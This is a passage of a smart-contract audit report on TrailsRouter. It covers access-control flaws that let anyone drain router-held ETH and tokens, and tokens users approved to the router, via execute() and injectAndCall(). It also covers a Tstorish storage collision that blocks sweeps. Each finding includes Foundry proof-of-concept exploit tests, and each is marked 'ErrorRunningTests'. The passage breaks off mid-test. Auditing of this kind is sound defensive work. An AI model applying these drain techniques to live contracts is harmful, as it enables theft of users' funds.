1. The router has 100 MOCK tokens (e.g., from a prior mis-sent transfer).
2. The attacker deploys a `TokenDrainer` contract with a function:
   `function drain(address token, address to, uint256 amount) external { IERC20(token).transferFrom(msg.sender, to, amount); }`
3. The attacker calls `router.injectAndCall(token, address(TokenDrainer), abi.encodeWithSelector(drain.selector, token, attacker, 100 ether), 0, bytes32(0))`.
4. `injectAndCall` reads `_getSelfBalance(token)` as 100 MOCK, sets `forceApprove(token, TokenDrainer, 100)` from the router, and calls `TokenDrainer.drain`.
5. Inside `TokenDrainer`, `msg.sender` is the router and `transferFrom(router, attacker, 100)` succeeds due to the newly granted allowance.
6. The attacker receives 100 MOCK and the router’s token balance becomes zero.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("MockToken", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Minimal Multicall3 implementation used for testing router.execute()
contract MockMulticall3 is IMulticall3 {
    function aggregate3(Call3[] calldata) external payable returns (Result[] memory) {
        revert("unused");
    }

    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory results) {
        uint256 length = calls.length;
        results = new Result[](length);
        for (uint256 i = 0; i < length; i++) {
            Call3Value calldata c = calls[i];
            (bool success, bytes memory ret) = c.target.call{value: c.value}(c.callData);
            require(success, "call failed");
            results[i] = Result({success: success, returnData: ret});
        }
    }
}

contract TokenDrainer {
    function drain(address token, address to, uint256 amount) external {
        IERC20(token).transferFrom(msg.sender, to, amount);
    }
}

contract RouterDrainTest is Test {
    TrailsRouter router;
    MockToken token;
    TokenDrainer drainer;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();
        drainer = new TokenDrainer();

        // Seed router with stray ERC20 balance (simulating accidental transfer/dust)
        token.mint(address(this), 1_000 ether);
        token.transfer(address(router), 100 ether);

        // Seed canonical Multicall3 address with mock code (local test env)
        MockMulticall3 mc = new MockMulticall3();
        vm.etch(router.MULTICALL3(), address(mc).code);
    }

    function test_AttackerCanDrainRouterTokensViaExecute() public {
        assertEq(token.balanceOf(address(router)), 100 ether, "router should hold 100 tokens");
        assertEq(token.balanceOf(attacker), 0, "attacker starts at 0");

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(IERC20.transfer.selector, attacker, 100 ether)
        });
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.prank(attacker);
        router.execute(data);

        assertEq(token.balanceOf(address(router)), 0, "router balance should be drained");
        assertEq(token.balanceOf(attacker), 100 ether, "attacker stole router tokens");
    }

    function test_AttackerCanDrainRouterEthViaExecute() public {
        // Seed router with stray ETH
        vm.deal(address(router), 1 ether);
        assertEq(address(router).balance, 1 ether, "router should hold 1 ETH");
        assertEq(attacker.balance, 0, "attacker starts at 0");

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: attacker,
            allowFailure: false,
            value: 1 ether,
            callData: bytes("")
        });
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        // No ETH sent by attacker; value is sourced from router balance under delegatecall
        vm.prank(attacker);
        router.execute(data);

        assertEq(address(router).balance, 0, "router ETH drained");
        assertEq(attacker.balance, 1 ether, "attacker received router ETH");
    }

    function test_AttackerCanDrainRouterTokensViaInjectAndCall() public {
        assertEq(token.balanceOf(address(router)), 100 ether, "router should hold 100 tokens");
        assertEq(token.balanceOf(attacker), 0, "attacker starts at 0");

        // Directly call public injectAndCall() against router-held balance
        bytes memory cd = abi.encodeWithSelector(TokenDrainer.drain.selector, address(token), attacker, 100 ether);
        router.injectAndCall(address(token), address(drainer), cd, 0, bytes32(0));

        assertEq(token.balanceOf(address(router)), 0, "router token balance drained");
        assertEq(token.balanceOf(attacker), 100 ether, "attacker received router tokens");
    }
}


## Suggested Mitigation
- Add onlyDelegatecall to functions that must only operate in the Sequence wallet context: at minimum injectAndCall() and execute(). This prevents EOAs from invoking them on the Router implementation and spending address(this) balances.
- Prefer removing the public execute() entrypoint entirely if not strictly required. For externally-triggered flows, rely on pullAndExecute/pullAmountAndExecute and injectSweepAndCall which source funds from msg.sender.
- If execute() must remain, still enforce onlyDelegatecall and expose an explicit delegated entry (similar to _injectAndCallDelegated) via handleSequenceDelegateCall to retain intended functionality in wallet context.
- For ETH safety in EOA flows, tighten invariants in pullAmountAndExecute when token == address(0): compute preExisting = address(this).balance - msg.value and require preExisting == 0, and optionally validate that the sum of Call3Value.value equals the provided amount/msg.value to avoid overspending any pre-existing contract ETH.
- Consider a one-time emergencySweep function gated by a trusted role to recover accidental Router-held funds if you choose to keep any public surface that could otherwise spend address(this) funds.


## [H-4]. Public execute/pullAmountAndExecute allow arbitrary calls from router context, letting anyone steal approved tokens and router-held funds

### Finding Severity Justification: execute and pullAmountAndExecute are publicly callable and perform delegatecall to Multicall3.aggregate3Value without restricting targets, causing each downstream call to be executed from the router’s context. Anyone can trigger arbitrary calls from the router, spending any ERC-20 allowances granted to the router by users (via transferFrom) and draining any ETH/ERC-20 balances held by the router. This enables direct, unbounded theft of user assets that approved the router, and any funds mistakenly left on the router.
## Derived From Pattern/Invariant
Router-held funds can be drained by anyone via unrestricted execute/multicall

## Exploit Type
AccessControl

## Location
TrailsRouter.execute

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter exposes execute and pullAmountAndExecute as public, payable functions with no access control or delegatecall guard, yet they perform a delegatecall into the canonical Multicall3 contract from the router’s own address. The only validation is _validateRouterCall(data), which enforces that the selector is aggregate3Value and that all Call3Value.allowFailure flags are false; it does not restrict Call3Value.target or callData. As a result, any external caller can have the router execute arbitrary calls from its own context.

In execute:
- execute(bytes calldata data) is public and payable.
- It calls _validateRouterCall(data), then performs:
  (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
- Under delegatecall, Multicall3.aggregate3Value runs in TrailsRouter’s context, so each call.target.call{value: call.value}(callData) spends ETH and uses approvals held by address(this) == TrailsRouter.

In pullAmountAndExecute:
- The function similarly calls _validateRouterCall, then for token == address(0) it only checks msg.value >= amount; for ERC20 it transfers amount from msg.sender into the router, but an attacker can call it with token == address(0) and amount == 0 to skip any meaningful checks and still reach the same delegatecall.

Attack consequences:
1) Theft of any user’s ERC-20 tokens that approved the router:
- If a user ever calls pullAndExecute/pullAmountAndExecute/injectSweepAndCall or any integrator asks the user to approve the router as ERC-20 spender, the router ends up with allowance[user][router] > 0.
- An attacker can then craft aggregate3Value data where a single call has target = token and callData = abi.encodeWithSelector(ERC20.transferFrom, victim, attacker, amount).
- When execute(data) is called, Multicall3 executes token.transferFrom(victim, attacker, amount) from the router address, consuming victim’s allowance to the router. No consent from victim is required at attack time.

2) Theft of any ERC-20 holdings of the router:
- If any ERC-20 tokens ever reside at the router address (mis-transfer, mis-integration, or incomplete multicall route), the attacker can craft a call with target = token and callData = abi.encodeWithSelector(ERC20.transfer, attacker, balance), draining the router’s balance.

3) Theft of any ETH balance on TrailsRouter:
- A call with Call3Value.target = attacker-controlled address and value set to the router’s ETH balance will send ETH directly from the router to that address.

This behavior directly violates the documented invariant that the router is intended to be a stateless, delegatecall-only extension for Sequence wallets. Instead, it behaves as a publicly accessible hot wallet that any EOA can instruct to spend both its own balances and any allowances other users have given to it.

## Impact
Any ERC-20 holder that has ever approved TrailsRouter as a spender can have their approved tokens stolen by a random attacker. Additionally, any ETH or ERC-20 accidentally or residually held on TrailsRouter can be drained by anyone. This is direct, unbounded theft of user funds and router-held balances.

## Command to Run Test


## Proof of Concept
1. Deploy TrailsRouter and a standard ERC-20 token.
2. Let victim be an EOA with 100 tokens; victim approves TrailsRouter for an unlimited allowance: token.approve(address(router), type(uint256).max).
3. Attacker crafts a Multicall3.aggregate3Value payload with a single Call3Value:
   - target = address(token)
   - allowFailure = false
   - value = 0
   - callData = abi.encodeWithSelector(token.transferFrom.selector, victim, attacker, 50 ether)
4. Attacker calls router.execute(data) with this payload.
5. Inside execute, the router delegatecalls into Multicall3; aggregate3Value iterates the single call and performs token.transferFrom(victim, attacker, 50 ether) from msg.sender == router.
6. Since victim previously approved the router, transferFrom succeeds and 50 tokens are transferred from victim to attacker without victim’s involvement.
7. The same pattern can be used to:
   - Call token.transfer(attacker, X) to drain any ERC-20 balance currently held by the router.
   - Call a simple recipient contract with non-zero Call3Value.value to transfer all router-held ETH to the attacker.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeMulticall3 is IMulticall3 {
    function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData) {
        uint256 len = calls.length;
        returnData = new Result[](len);
        for (uint256 i; i < len; i++) {
            Call3 calldata c = calls[i];
            (bool success, bytes memory ret) = c.target.call(c.callData);
            if (!success && !c.allowFailure) revert("call failed");
            returnData[i] = Result({success: success, returnData: ret});
        }
    }

    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData) {
        uint256 len = calls.length;
        returnData = new Result[](len);
        for (uint256 i; i < len; i++) {
            Call3Value calldata c = calls[i];
            (bool success, bytes memory ret) = c.target.call{value: c.value}(c.callData);
            if (!success && !c.allowFailure) revert("call failed");
            returnData[i] = Result({success: success, returnData: ret});
        }
    }
}

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract RouterExecuteExploitTest is Test {
    TrailsRouter router;
    MockToken token;
    address victim = address(0xBEEF);
    address attacker = address(0xCAFE);

    function setUp() public {
        // Install a fake Multicall3 implementation at the canonical address used by TrailsRouter
        FakeMulticall3 mc = new FakeMulticall3();
        address multicallAddr = address(0xcA11bde05977b3631167028862bE2a173976CA11);
        vm.etch(multicallAddr, address(mc).code);

        router = new TrailsRouter();
        token = new MockToken();

        // Fund victim and approve router
        token.mint(victim, 100 ether);
        vm.prank(victim);
        token.approve(address(router), type(uint256).max);

        // Give attacker some ETH for gas if needed
        vm.deal(attacker, 1 ether);
    }

    function test_StealApprovedTokens_ViaExecute() public {
        // Attacker crafts aggregate3Value payload to steal 50 tokens from victim
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(token.transferFrom.selector, victim, attacker, 50 ether)
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.prank(attacker);
        router.execute(data);

        assertEq(token.balanceOf(attacker), 50 ether, "attacker received stolen tokens");
        assertEq(token.balanceOf(victim), 50 ether, "victim lost tokens");
    }

    function test_DrainRouterETH_ViaExecute() public {
        // Fund the router with ETH (simulating mistakenly left funds)
        vm.deal(address(router), 2 ether);
        uint256 attackerBefore = attacker.balance;

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: attacker,
            allowFailure: false,
            value: 1 ether,
            callData: bytes("")
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.prank(attacker);
        router.execute{value: 0}(data);

        assertEq(attacker.balance, attackerBefore + 1 ether, "attacker drained router ETH");
    }
}


## Suggested Mitigation
- Require delegatecall-only execution for any function that delegates into Multicall3. Add the onlyDelegatecall modifier to execute, pullAndExecute, and pullAmountAndExecute so they cannot be invoked directly on the router implementation address.
- If EOA/public aggregation is desired, do not reuse a shared router address. Instead deploy per-user wrappers (e.g., minimal proxies via CREATE2 keyed by the user) and ensure those wrappers restrict execution to their owner; users grant allowances to their own wrapper, not to a global contract.
- As additional hardening, if any public multicall veneer must remain shared, restrict allowed targets to an audited allowlist of protocol contracts and disallow arbitrary ERC-20s or externally supplied addresses. This removes the ability to craft transfer/transferFrom calls against unrelated approvals or drain native balance.


## [L-5]. Public router helpers let anyone drain ETH and ERC20 balances held by TrailsRouter

### Finding Severity Justification: Anyone can drain any ETH/ERC20 balances that end up held by the TrailsRouter via publicly callable helpers (injectAndCall and execute). Impact is limited to funds mistakenly or unexpectedly resident on the router, which is designed to be stateless and not custody user assets. This does not create a realistic path to steal users’ funds held in wallets/intents, but it does make any stray/dust or mis-sent funds directly stealable instead of merely stuck.
## Derived From Pattern/Invariant
Router-held funds can be drained by anyone via unrestricted execute/multicall

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter exposes helpers that operate on the contract’s own balances without any access control. In particular, `injectAndCall` reads the full balance of `address(this)` and forwards it to an arbitrary user-controlled target, and `execute` allows arbitrary token calls from the router’s context via Multicall3.

Relevant code:

`injectAndCall` (public, no onlyDelegatecall):

    function injectAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) public payable {
        uint256 callerBalance = _getSelfBalance(token);
        if (callerBalance == 0) {
            if (token == address(0)) {
                revert NoEthAvailable();
            } else {
                revert NoTokensToSweep();
            }
        }

        _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
    }

`_injectAndExecuteCall` then unconditionally forwards the entire balance:

    function _injectAndExecuteCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder,
        uint256 callerBalance
    ) internal {
        ...
        if (token == address(0)) {
            (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
            ...
        } else {
            IERC20 erc20 = IERC20(token);
            SafeERC20.forceApprove(erc20, target, callerBalance);

            (bool success, bytes memory result) = target.call(callData);
            ...
        }
    }

There is no `onlyDelegatecall` guard, so when called directly (not via delegatecall from a Sequence wallet), `_getSelfBalance(token)` reads the router’s own ETH / ERC20 balance.

Similarly, `execute` delegates into Multicall3 without restricting targets:

    function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
        _validateRouterCall(data);
        (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(returnData);
        return abi.decode(returnData, (IMulticall3.Result[]));
    }

The delegated `aggregate3Value(Call3Value[])` implementation will execute arbitrary `target.call{value: call.value}(callData)` using the router as `msg.sender`. If the router ever holds ERC20 balances (e.g. from `pullAmountAndExecute`, `injectSweepAndCall`, or accidental transfers), a caller can craft a single-call array where `target` is that token contract and `callData` is `transfer(attacker, amount)` and drain all router-held tokens.

The protocol intends TrailsRouter to be stateless and not hold user funds, but that assumption is not enforced. Any ETH or tokens that end up at the router address (via mis-integration, partial multicalls that leave dust, or direct transfers) become globally stealable: any address can call `injectAndCall` or `execute` to forward those balances to itself.

## Impact
Any ETH or ERC20 tokens that end up held by the TrailsRouter contract (from mis-sent funds, integration mistakes, or leftover balances from previous calls) can be stolen by any arbitrary caller. This converts what would otherwise be stuck funds into directly stealable funds. While core Trails flows intend the router to be stateless, in practice contracts often accumulate dust or temporary balances, so the blast radius can be real if third-party integrators rely on these helpers.

## Command to Run Test


## Proof of Concept
Scenario for draining ETH held by TrailsRouter:
1. Some integration or user sends ETH directly to the TrailsRouter implementation address, or leaves ETH behind there due to a misconfigured call (the router has a `receive()` function and can hold ETH).
2. An attacker monitors the router address and sees a non-zero ETH balance, say 10 ETH.
3. The attacker calls:
   - `TrailsRouter.injectAndCall(token = address(0), target = attacker, callData = "", amountOffset = 0, placeholder = 0)`.
4. Inside `injectAndCall`, `_getSelfBalance(address(0))` returns 10 ETH (the router’s entire balance), and `_injectAndExecuteCall` executes `attacker.call{value: 10 ether}("")`.
5. The call succeeds; the router’s ETH balance becomes 0, and the attacker now holds the 10 ETH.

Scenario for draining ERC20 held by TrailsRouter:
1. A prior `pullAmountAndExecute` or `injectSweepAndCall` call, or a mistaken transfer, leaves 1,000 tokens of `TOKEN` at `address(router)` instead of forwarding them to the intended recipient.
2. The attacker calls:
   - `injectAndCall(token = TOKEN, target = TOKEN, callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, 1000e18), amountOffset = 0, placeholder = 0)`.
3. `_getSelfBalance(TOKEN)` returns 1,000 tokens (the router’s entire TOKEN balance). `_injectAndExecuteCall` first `forceApprove(TOKEN, TOKEN, 1000e18)` and then calls `TOKEN.call(callData)`.
4. The token contract executes `transfer(attacker, 1000e18)` from `msg.sender == address(router)`, moving all 1,000 tokens from the router to the attacker.

Equivalent drains for ERC20 tokens can also be performed via `execute`:
1. The attacker crafts `IMulticall3.Call3Value[] calls` of length 1 with:
   - `target = TOKEN`, `value = 0`, `allowFailure = false`, `callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, routerTokenBalance)`.
2. They encode `data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls)` and call `TrailsRouter.execute(data)`.
3. `_validateRouterCall` passes (selector is `aggregate3Value`, `allowFailure` is false). `MULTICALL3.delegatecall(data)` runs, and its internal `target.call(callData)` invokes `TOKEN.transfer(attacker, amount)` from the router, draining any token balance held there.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract Multicall3Stub is IMulticall3 {
    function aggregate3(Call3[] calldata) external payable returns (Result[] memory) {
        revert("unused");
    }

    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData) {
        uint256 length = calls.length;
        returnData = new Result[](length);
        for (uint256 i = 0; i < length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
            require(success, "call failed");
            returnData[i] = Result(success, ret);
        }
    }
}

contract TrailsRouterDrainTest is Test {
    TrailsRouter router;
    MockERC20 token;
    address payable attacker = payable(address(0xBEEF));

    function setUp() external {
        router = new TrailsRouter();
        token = new MockERC20();

        // Seed stray funds on the router
        vm.deal(address(router), 1 ether);
        token.mint(address(router), 1e18);

        // Install a Multicall3 stub at the canonical address used by the router
        Multicall3Stub stub = new Multicall3Stub();
        address multicall = router.MULTICALL3();
        vm.etch(multicall, address(stub).code);
    }

    function testDrainEthWithInjectAndCall() external {
        uint256 routerEthBefore = address(router).balance;
        vm.prank(attacker);
        router.injectAndCall(address(0), attacker, "", 0, bytes32(0));
        assertEq(address(attacker).balance, routerEthBefore);
        assertEq(address(router).balance, 0);
    }

    function testDrainErc20WithInjectAndCall() external {
        uint256 routerTokenBefore = token.balanceOf(address(router));
        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(token),
            abi.encodeWithSelector(token.transfer.selector, attacker, routerTokenBefore),
            0,
            bytes32(0)
        );
        assertEq(token.balanceOf(attacker), routerTokenBefore);
        assertEq(token.balanceOf(address(router)), 0);
    }

    function testDrainEthWithExecute() external {
        uint256 routerEthBefore = address(router).balance;
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: attacker,
            allowFailure: false,
            value: routerEthBefore,
            callData: ""
        });
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);
        vm.prank(attacker);
        router.execute(data);
        assertEq(address(attacker).balance, routerEthBefore);
        assertEq(address(router).balance, 0);
    }

    function testDrainErc20WithExecute() external {
        uint256 amt = token.balanceOf(address(router));
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(IERC20.transfer.selector, attacker, amt)
        });
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);
        vm.prank(attacker);
        router.execute(data);
        assertEq(token.balanceOf(attacker), amt);
        assertEq(token.balanceOf(address(router)), 0);
    }
}


## Suggested Mitigation
- Add onlyDelegatecall to both execute() and injectAndCall() so they can only be invoked from a Sequence wallet context via delegatecall. External integrators should use pullAndExecute/pullAmountAndExecute (which source funds from msg.sender) or injectSweepAndCall (which pulls from msg.sender) instead.
- Optionally remove the public injectAndCall surface entirely and route delegated use through the existing _injectAndCallDelegated() via handleSequenceDelegateCall.
- If desired to avoid permanently stuck accidental funds after restricting these functions, add a restricted rescue method (e.g., onlyOwner or timelocked guardian) to sweep stray ETH/erc20 from the Router contract address. Document clearly that holding balances on the Router is unsupported and unsafe.





 **Derived From** : Tstorish storage flag collides under delegatecall and can break sentinel reads

## [M-6]. Tstorish _tstoreSupport flag collides under delegatecall, breaking validateOpHashAndSweep sentinel logic

### Finding Severity Justification: The bug can systematically DoS the validateOpHashAndSweep gate under delegatecall on chains that did not support TSTORE at deployment. This breaks the intended sentinel check and prevents fee sweep/refund flows from advancing, potentially leaving funds in the Sequence wallet until manual recovery. Assets are not directly lost, but protocol functionality and availability are impacted, fitting a Medium severity.
## Derived From Pattern/Invariant
Tstorish storage flag collides under delegatecall and can break sentinel reads

## Exploit Type
StorageLayout

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The issue depends on the chain’s TSTORE availability at deployment and the caller’s slot 0 value. While very plausible in multi-chain settings and reproducible in tests, we do not have the Shim source here to confirm its exact sentinel write method in all cases. Given these environment dependencies, confidence is somewhat reduced despite the clear delegatecall storage-collision bug.
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter inherits `Tstorish` and is explicitly designed to be used via delegatecall from a Sequence v3 wallet (or TrailsRouterShim). Under delegatecall, Tstorish’s non-namespaced storage flag `_tstoreSupport` collides with the host wallet's storage, which can cause `validateOpHashAndSweep` to misbehave or revert on chains without TSTORE support.

Relevant code in TrailsRouter:

```solidity
contract TrailsRouter is IDelegatedExtension, ITrailsRouter, DelegatecallGuard, Tstorish {
    ...
    function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient)
        public
        payable
        onlyDelegatecall
    {
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) {
            revert SuccessSentinelNotSet();
        }
        sweep(_token, _recipient);
    }
}
```

`TrailsSentinelLib.successSlot(opHash)` returns a keccak-derived slot where a success sentinel `SUCCESS_VALUE` (1) should have been written by the shim after a successful operation.

Tstorish implementation (simplified):

```solidity
contract Tstorish {
    bool private _tstoreSupport; // slot 0 in the executing contract
    ...
    function(uint256) view returns (uint256) internal immutable _getTstorish;

    constructor() {
        bool tstoreInitialSupport = _testTload(_prepareTloadTest());
        if (tstoreInitialSupport) {
            _getTstorish = _getTstore; // uses tload
        } else {
            _getTstorish = _getTstorishWithSloadFallback;
        }
    }

    function _getTstorishWithSloadFallback(uint256 storageSlot)
        private
        view
        returns (uint256 value)
    {
        if (_tstoreSupport) {
            assembly { value := tload(storageSlot) }
        } else {
            assembly { value := sload(storageSlot) }
        }
    }

    function __activateTstore() external {
        if (msg.sender != tx.origin) revert OnlyDirectCalls();
        ...
        _tstoreSupport = true;
    }
}
```

On chains where TSTORE is **not** supported at the time TrailsRouter is deployed, the constructor sets `_getTstorish` to `_getTstorishWithSloadFallback`. This function decides whether to use `tload` or `sload` based on the `_tstoreSupport` boolean.

However:

- Under delegatecall, all storage of Tstorish is read and written in the **caller’s** storage context (e.g., the Sequence wallet), not in the TrailsRouter contract.
- `_tstoreSupport` therefore refers to **slot 0 of the host wallet**, not a namespaced flag owned by Tstorish.
- If the wallet’s slot 0 happens to be non-zero (e.g., storing an address, nonce, or other state), then `_tstoreSupport` will be interpreted as `true` even though `__activateTstore()` was never called in that context.
- On a chain where TSTORE is not available, this causes `_getTstorishWithSloadFallback` to execute the `tload` opcode, which will revert with an invalid opcode.

Consequences for `validateOpHashAndSweep` when used via delegatecall:

- The call to `_getTstorish(successSlot(opHash))` can revert due to an invalid `tload` if `_tstoreSupport` is interpreted as `true` from the wallet's slot 0.
- Even if it does not revert (e.g., on chains that later adopt TSTORE), it will read from transient storage or the wrong storage backend, causing the sentinel read to fail and incorrectly revert with `SuccessSentinelNotSet` even when the shim has correctly set the sentinel using `sstore`.

This breaks a core invariant: `validateOpHashAndSweep` is supposed to only sweep funds when the success sentinel is set, and otherwise do nothing. In the presence of this storage collision:

- Sentinel checks become unusable or unreliable for wallets whose slot 0 is non-zero on chains without TSTORE.
- Any intent flow that relies on `validateOpHashAndSweep` for fee collection or sweeping can systematically revert, leaving funds stuck in the intent wallet until the user or integrator constructs a manual sweep call bypassing `validateOpHashAndSweep`.

Because `_tstoreSupport` is a plain, un-namespaced storage slot, **any host contract** using TrailsRouter via delegatecall (not only Sequence wallets) can suffer from this issue depending on its slot-0 contents and the chain's TSTORE support.

## Impact
Under delegatecall on chains where TSTORE was not supported at TrailsRouter deployment, the private flag _tstoreSupport in Tstorish resides at storage slot 0 of the host wallet, not the router. If the host’s slot 0 is non-zero, Tstorish incorrectly believes TSTORE is activated and executes tload, which reverts on pre-TSTORE chains and DoSes validateOpHashAndSweep. If/when the chain later enables TSTORE, the router would read transient storage while the sentinel was written via sstore, causing consistent false negatives (SuccessSentinelNotSet) and still preventing sweeping. This breaks the sentinel gate and can systematically block fee sweep/refund flows until manual recovery, impacting availability rather than directly stealing funds.

## Command to Run Test


## Proof of Concept
Exploit preconditions: Router is deployed on a chain that did not support TSTORE at deployment, so Tstorish configured _getTstorish to the sload-fallback version. A host wallet with a non-zero slot 0 delegates to the router.

Steps:
1) Deploy TrailsRouter on a chain/environment without TSTORE support at deployment time.
2) Deploy a MockWallet that stores a non-zero value at slot 0 (e.g., uint256 public dummy = 1).
3) Precompute successSlot = TrailsSentinelLib.successSlot(opHash) and set SUCCESS_VALUE there in the wallet’s storage (simulating the shim writing the sentinel via sstore).
4) From MockWallet, delegatecall TrailsRouter.validateOpHashAndSweep(opHash, token, recipient).
   - Under delegatecall, Tstorish reads _tstoreSupport from the host’s slot 0 (non-zero), decides to use tload, and reverts (invalid opcode) on a pre-TSTORE chain. If TSTORE is available, it reads from transient storage and returns 0, causing SuccessSentinelNotSet. Either way, sweeping is blocked.
5) Control: Zero out the host’s slot 0 and call again. Now Tstorish uses sload and correctly reads SUCCESS_VALUE, then sweep succeeds. This demonstrates collision-induced failure.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/TrailsRouter.sol";
import "src/libraries/TrailsSentinelLib.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken2 is ERC20 {
    constructor() ERC20("Mock2", "MK2") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Host wallet that will delegatecall into TrailsRouter
contract MockWallet {
    // Occupies storage slot 0 with a non-zero value
    uint256 public dummy = 1; // slot 0

    function delegatedValidate(address routerAddr, bytes32 opHash, address token, address recipient) external {
        (bool success, bytes memory returndata) = routerAddr.delegatecall(
            abi.encodeWithSelector(TrailsRouter.validateOpHashAndSweep.selector, opHash, token, recipient)
        );
        require(success, string(returndata));
    }

    receive() external payable {}
}

contract TstorishCollisionTest is Test {
    TrailsRouter router;
    MockWallet wallet;
    MockToken2 token;

    function setUp() public {
        router = new TrailsRouter();
        wallet = new MockWallet();
        token = new MockToken2();

        // Fund the wallet with ERC20 to be swept on success
        token.mint(address(wallet), 1 ether);
    }

    function test_CollisionCausesValidateToRevert() public {
        // Prepare opHash and write SUCCESS sentinel via sstore to the wallet's storage
        bytes32 opHash = keccak256("test-op");
        uint256 slot = TrailsSentinelLib.successSlot(opHash);

        vm.store(address(wallet), bytes32(slot), bytes32(TrailsSentinelLib.SUCCESS_VALUE));

        // Because wallet.slot0 (dummy) is non-zero, _tstoreSupport is read as true in the host context.
        // On chains where TSTORE was not supported at router deployment, this forces tload and reverts.
        // If TSTORE is supported, it still fails by reading transient storage (returns 0) and reverts with SuccessSentinelNotSet.
        vm.expectRevert();
        wallet.delegatedValidate(address(router), opHash, address(token), address(this));
    }

    function test_NoCollisionAllowsSuccessfulSweep() public {
